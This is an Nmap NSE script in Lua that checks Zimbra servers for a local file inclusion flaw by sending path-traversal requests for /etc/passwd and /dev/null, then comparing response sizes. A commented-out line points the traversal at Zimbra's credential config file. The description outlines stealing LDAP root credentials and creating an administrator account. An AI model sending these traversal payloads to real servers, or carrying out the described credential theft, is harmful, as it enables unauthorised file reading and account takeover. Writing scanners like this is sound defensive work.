local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
A 0 day was been released on the 6th december 2013 by rubina119, and was patched in Zimbra 7.2.6.

The vulnerability is a local file inclusion that can retrieve any file from the server.

Currently, we read /etc/passwd and /dev/null, and compare the lengths to determine vulnerability.

TODO:
Add the possibility to read compressed file.
Then, send some payload to create the new mail account.
]]

---
-- @usage
-- nmap -sV --script http-vuln-0-day-lfi-zimbra <target>
-- nmap -p80 --script http-vuln-0-day-lfi-zimbra --script-args http-vuln-0-day-lfi-zimbra=/ZimBra <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-0-day-lfi-zimbra:
-- |   VULNERABLE:
-- |   Zimbra Local File Inclusion and Disclosure of Credentials
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  None, 0-day
-- |     Description:
-- |       A 0 day has been released on the 6th december 2013 by rubina119.
-- |       The vulnerability is a local file inclusion that can retrieve the credentials of the Zimbra installations etc.
-- |       Using this script, we can detect if the file is present.
-- |       If the file is present, we assume that the host might be vulnerable.
-- |
-- |       In future version, we'll extract credentials from the file but it's not implemented yet and
-- |       the detection will be accurate.
-- |
-- |       TODO:
-- |       Add the possibility to read compressed file (because we're only looking if it exists)
-- |       Then, send some payload to create the new mail account
-- |     Disclosure date: 2013-06-12
-- |     Extra information:
-- |       Proof of Concept:/index.php?-s
-- |     References:
-- |_      http://www.exploit-db.com/exploits/30085/
--
-- @args http-vuln-0-day-lfi-zimbra.uri URI. Default: /zimbra
---

author = "Paul AMAR <aos.paul@gmail.com>, Ron Bowes"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

-- function to escape specific characters
local escape = function(str) return string.gsub(str, "", "") end

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/zimbra"

  local vuln = {
       title = 'Zimbra Local File Inclusion (Gather admin credentials)',
       state = vulns.STATE.NOT_VULN, -- default
       description = [[
This script exploits a Local File Inclusion in
/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
which allows us to see any file on the filesystem, including config files
that contain LDAP root credentials, allowing us to make requests in
/service/admin/soap API with the stolen LDAP credentials to create user
with administration privileges and gain access to the Administration Console.

This issue was patched in Zimbra 7.2.6.
]],
       references = {
          'http://www.exploit-db.com/exploits/30085/',
       },
       dates = {
           disclosure = {year = '2013', month = '12', day = '6'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local file_short = "../../../../../../../../../dev/null"
  local file_long = "../../../../../../../../../etc/passwd"
  --local file_long = "../../../../../../../../../opt/zimbra/conf/localconfig.xml"

  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%00"
  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%00"

  stdnse.print_debug(1, "Trying to detect if the server is vulnerable")
  stdnse.print_debug(1, "GET " .. uri .. escape(url_short))
  stdnse.print_debug(1, "GET " .. uri .. escape(url_long))

  local session_short = http.get(host, port, uri..url_short)
  local session_long = http.get(host, port, uri..url_long)

  if session_short and session_short.status == 200 and session_long and session_long.status == 200 then
    if session_short.header['content-type'] == "application/x-javascript" then
      -- Because .gz format is somewhat odd, giving a bit of a margin of error here
      if (string.len(session_long.body) - string.len(session_short.body)) > 100 then
        stdnse.print_debug(1, "The website appears to be vulnerable a local file inclusion vulnerability in Zimbra")
        vuln.state = vulns.STATE.EXPLOIT
        return vuln_report:make_output(vuln)
      else
        stdnse.print_debug(1, "The host does not appear to be vulnerable")
        vuln.state = vulns.STATE.NOT_VULN
        return vuln_report:make_output(vuln)
      end
    else
      stdnse.print_debug(1, "Bad content-type for the resource : " .. session_short.header['content-type'])
      return
    end
  else
      stdnse.print_debug(1, "The website seems to be not vulnerable to this attack.")
      return
  end
end
